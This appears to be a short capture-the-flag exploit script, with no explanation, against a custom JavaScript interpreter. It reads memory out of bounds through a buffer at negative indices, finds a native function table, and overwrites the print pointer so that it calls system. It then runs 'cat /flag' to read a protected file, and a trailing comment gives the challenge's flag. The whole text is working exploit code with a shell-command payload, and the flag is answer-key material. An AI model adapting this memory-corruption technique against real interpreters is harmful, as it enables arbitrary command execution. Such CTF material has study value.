a = new OOOBufferOOO(10);
at = 0;
for(var i = 0 ; ;i--) {
  if(a.readUInt8(-i) == 0x70
    && (a.readUInt8(-i+1) & 0xf) == 2
    && (a.readUInt8(-i+5) & 0xf0) == 0x50
    && a.readUInt8(-i+6) == 0
    && a.readUInt8(-i+7) == 0
  ) {
    print(at = -i); 
    a.writeUInt32LE(0x20000000, at - 3); // native_print -> native_system
    print("cat /flag")
    // break;
  }
}
while(1) {}
// OOO{Rule #3: Never `open` the package. Who knows what pwns are lying about?}
